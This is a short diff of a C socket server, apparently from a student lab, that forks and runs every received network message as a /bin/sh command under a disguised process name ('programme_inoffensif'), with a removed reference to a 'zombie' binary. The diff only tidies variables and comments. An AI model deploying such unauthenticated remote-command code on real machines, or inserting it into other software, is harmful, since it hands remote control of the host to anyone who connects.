@@ -28,9 +28,9 @@ int main(int argc, char **argv) {
   int ret;
   StructPort structPort;
   // struct pollfd fds[MAX_PLAYERS];
-  int port;
+
   if (argc > 1) {
-    port = atoi(argv[1]);
+    int port = atoi(argv[1]);
     sockfd = initSocketServer(port);
     printf("The server listens on the port : %d \n", port);
   } else {
@@ -48,8 +48,7 @@ int main(int argc, char **argv) {
     newsockfd = saccept(sockfd); // quand labo mettre accept!!
 
     if (newsockfd > 0) {
-      printf("ret : %d & sock: %d\n", ret, newsockfd);
-      while ((ret = sread(newsockfd, msg, sizeof(msg))) != 0) {
+      while (sread(newsockfd, msg, sizeof(msg)) != 0) {
         fork_and_run2(childExec, &newsockfd, msg);
       }
       sclose(newsockfd);
@@ -71,9 +70,6 @@ void childExec(void *sockfd, void *command) {
 
   execl("/bin/sh", "programme_inoffensif", "-c", script, NULL);
   // system(script);
-
-  // execl("./zombie" ,"programme_inoffensif", command);
-  // execl("/bin/sh", "programme_inoffensif", "-c", script, (char *)NULL);
   perror("Something went wrong with execvp\n");
   exit(EXIT_FAILURE);
 }
